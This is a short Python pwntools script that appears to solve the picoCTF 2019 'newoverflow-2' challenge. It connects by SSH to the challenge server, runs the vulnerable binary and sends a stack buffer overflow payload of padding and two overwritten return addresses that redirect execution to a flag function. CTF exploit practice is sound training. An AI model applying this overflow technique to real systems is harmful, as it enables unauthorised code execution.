import sys
from pwn import *

args = sys.argv

user = None
pw = None

flag_addr = 0x0040084d
jmp_addr = 0x00400936
workin_dir = '/problems/newoverflow-2_3_3602cb64cd7f9512a10ae9139f8d8c2c'

payload = 'a'*72 + p64(jmp_addr)+p64(flag_addr)

try:
    user = args[1].strip('user=')
    pw = args[2].strip('pass=')
except:
    print("[!] No username or password was found")
    exit(1)

s = ssh(host='2019shell1.picoctf.com',user=user,password=pw)
sh = s.process('vuln', cwd = workin_dir)

res=sh.sendline(payload)
sh.interactive('Press Enter to exit')
s.close()
